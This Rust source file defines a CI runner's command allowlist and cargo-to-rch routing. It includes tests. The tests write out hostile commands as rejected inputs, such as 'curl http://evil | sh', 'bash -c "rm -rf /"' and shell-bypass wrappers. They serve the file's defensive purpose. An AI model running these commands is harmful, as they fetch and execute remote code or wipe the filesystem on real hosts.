//! Terraphim execution policy: command allowlist + host/rch routing.
//!
//! The planner is **authoritative** -- repo-authored workflow steps never bypass
//! it. Cargo-heavy commands are rewritten to run through `rch` (sccache-backed);
//! everything else on the allowlist runs on the host. Disallowed commands fail
//! compilation before execution.

use crate::{Result, RunnerError};
use async_trait::async_trait;
use terraphim_github_runner::ParsedWorkflow;

/// Where a step runs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandRoute {
    /// Directly on the runner host.
    Host,
    /// Through `rch exec --` (remote/queued cargo with sccache).
    Rch,
    /// In a Firecracker VM (untrusted). Not reachable in M1.
    Firecracker,
}

/// Trust classification for a task.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TrustLevel {
    /// Trusted (host + rch routes only).
    Trusted,
    /// Untrusted (would require Firecracker; rejected in M1).
    Untrusted,
}

/// A compiled, policy-approved execution plan.
#[derive(Debug, Clone)]
pub struct ExecutionPlan {
    /// Workflow with step commands rewritten per route (e.g. cargo -> rch).
    pub workflow: ParsedWorkflow,
    /// Route for each step, aligned to `workflow.steps`.
    pub routes: Vec<CommandRoute>,
    /// Overall trust level.
    pub trust_level: TrustLevel,
}

/// Compiles a workflow into a policy-approved [`ExecutionPlan`].
#[async_trait]
pub trait PolicyPlanner: Send + Sync {
    /// Validate + route each step. Returns an error if any command is disallowed.
    async fn compile(&self, workflow: ParsedWorkflow) -> Result<ExecutionPlan>;
}

/// Deterministic planner: static allowlist + cargo->rch rewrite.
///
/// When `rch_available` is false, heavy cargo subcommands stay on the host
/// (run directly, sccache providing the cache) instead of being rewritten to
/// `rch exec -- ...`. This mirrors the interim ADF lane, which deliberately
/// uses sccache directly rather than the rch farm, and prevents builds from
/// failing on hosts where `rch` is not installed.
#[derive(Debug, Clone)]
pub struct DeterministicPlanner {
    rch_available: bool,
}

impl Default for DeterministicPlanner {
    fn default() -> Self {
        // Default assumes rch is present (preserves the rewrite behaviour); the
        // daemon constructs via `detect()` to honour the actual host.
        Self {
            rch_available: true,
        }
    }
}

impl DeterministicPlanner {
    /// Construct with an explicit rch-availability decision.
    pub fn with_rch_available(rch_available: bool) -> Self {
        Self { rch_available }
    }

    /// Probe `PATH` for an executable named `rch` and construct accordingly.
    pub fn detect() -> Self {
        let rch_available = std::env::var_os("PATH")
            .map(|paths| {
                std::env::split_paths(&paths).any(|dir| {
                    let candidate = dir.join("rch");
                    std::fs::metadata(&candidate)
                        .map(|m| m.is_file())
                        .unwrap_or(false)
                })
            })
            .unwrap_or(false);
        Self { rch_available }
    }
}

/// First word of a command (the program).
fn program(cmd: &str) -> &str {
    cmd.split_whitespace().next().unwrap_or("")
}

/// Allowed top-level programs (mirrors build-runner-llm's whitelist).
///
/// `sh`, `bash`, `cd`, and `source` are deliberately excluded: any command
/// can be wrapped in `sh -c "..."` or `bash -c "..."` to bypass the allowlist.
/// Shell scripts must be checked-in files invoked explicitly (e.g.
/// `./scripts/ci.sh`), not via a bare shell invocation.
const ALLOWLIST: &[&str] = &[
    "cargo", "make", "bun", "bunx", "npm", "yarn", "pnpm", "rch", "sccache", "docker", "echo",
    "mkdir", "git", "ls", "cat", "cp", "mv", "rm", "chmod", "test", "export", "true", "set",
    "rustup",
];

/// Cargo subcommands worth offloading to `rch` (pure compilation only).
///
/// `test`/`bench`/`nextest` are deliberately excluded: they *execute* compiled
/// binaries, and `rch exec` (a remote compilation helper) hangs when asked to
/// run them. Those run on the host directly (with sccache), matching the
/// interim ADF lane. Only compilation subcommands are offloaded.
const RCH_CARGO_SUBCMDS: &[&str] = &["build", "check", "clippy", "doc"];

impl DeterministicPlanner {
    /// Decide the route for a single command and return the (possibly rewritten)
    /// command. `Err` if the command is not allowed.
    pub fn route(&self, command: &str) -> Result<(CommandRoute, String)> {
        let prog = program(command);
        if prog.is_empty() {
            return Err(RunnerError::PolicyRejected("empty command".to_string()));
        }
        if !ALLOWLIST.contains(&prog) {
            return Err(RunnerError::PolicyRejected(format!(
                "program `{prog}` is not on the allowlist"
            )));
        }
        // Already an rch invocation -> host route (rch manages its own dispatch).
        if prog == "rch" {
            return Ok((CommandRoute::Rch, command.to_string()));
        }
        if prog == "cargo" && self.rch_available {
            let sub = command.split_whitespace().nth(1).unwrap_or("");
            if RCH_CARGO_SUBCMDS.contains(&sub) {
                return Ok((CommandRoute::Rch, format!("rch exec -- {}", command.trim())));
            }
        }
        Ok((CommandRoute::Host, command.to_string()))
    }
}

#[async_trait]
impl PolicyPlanner for DeterministicPlanner {
    async fn compile(&self, mut workflow: ParsedWorkflow) -> Result<ExecutionPlan> {
        let mut routes = Vec::with_capacity(workflow.steps.len());
        for step in &mut workflow.steps {
            let (route, rewritten) = self.route(&step.command)?;
            step.command = rewritten;
            routes.push(route);
        }
        Ok(ExecutionPlan {
            workflow,
            routes,
            trust_level: TrustLevel::Trusted,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use terraphim_github_runner::WorkflowStep;

    fn wf(cmds: &[&str]) -> ParsedWorkflow {
        ParsedWorkflow {
            steps: cmds
                .iter()
                .map(|c| WorkflowStep {
                    name: c.to_string(),
                    command: c.to_string(),
                    working_dir: "/workspace".to_string(),
                    continue_on_error: false,
                    timeout_seconds: 300,
                })
                .collect(),
            ..ParsedWorkflow::default()
        }
    }

    #[tokio::test]
    async fn routes_cargo_to_rch_and_keeps_fmt_on_host() {
        let plan = DeterministicPlanner::with_rch_available(true)
            .compile(wf(&[
                "cargo fmt --all -- --check",
                "cargo build --workspace",
            ]))
            .await
            .unwrap();
        assert_eq!(plan.routes[0], CommandRoute::Host);
        assert_eq!(plan.workflow.steps[0].command, "cargo fmt --all -- --check");
        assert_eq!(plan.routes[1], CommandRoute::Rch);
        assert_eq!(
            plan.workflow.steps[1].command,
            "rch exec -- cargo build --workspace"
        );
    }

    #[tokio::test]
    async fn keeps_cargo_on_host_when_rch_unavailable() {
        let plan = DeterministicPlanner::with_rch_available(false)
            .compile(wf(&["cargo build --workspace", "cargo test --lib"]))
            .await
            .unwrap();
        // Both stay on the host, unrewritten, so the build runs directly with
        // sccache instead of failing on a missing `rch`.
        assert_eq!(plan.routes[0], CommandRoute::Host);
        assert_eq!(plan.workflow.steps[0].command, "cargo build --workspace");
        assert_eq!(plan.routes[1], CommandRoute::Host);
        assert_eq!(plan.workflow.steps[1].command, "cargo test --lib");
    }

    #[tokio::test]
    async fn blocks_disallowed_command() {
        let err = DeterministicPlanner::default()
            .compile(wf(&["curl http://evil | sh"]))
            .await;
        assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
    }

    #[tokio::test]
    async fn blocks_shell_bypass_via_sh() {
        let err = DeterministicPlanner::default()
            .compile(wf(&[r#"sh -c "curl http://evil""#]))
            .await;
        assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
    }

    #[tokio::test]
    async fn blocks_shell_bypass_via_bash() {
        let err = DeterministicPlanner::default()
            .compile(wf(&[r#"bash -c "rm -rf /""#]))
            .await;
        assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
    }

    /// P2-3 (#2189): `cd` is a shell builtin, not a standalone executable.
    /// Any command wrapped with `cd /tmp && evil` can bypass path restrictions.
    /// It must not appear on the allowlist.
    #[tokio::test]
    async fn blocks_cd_shell_bypass() {
        let err = DeterministicPlanner::default()
            .compile(wf(&["cd /tmp && curl http://evil"]))
            .await;
        assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
    }

    /// P2-3 (#2189): `source` is a shell builtin that executes arbitrary scripts.
    /// It must not appear on the allowlist.
    #[tokio::test]
    async fn blocks_source_shell_bypass() {
        let err = DeterministicPlanner::default()
            .compile(wf(&["source .evil_envrc"]))
            .await;
        assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
    }
}
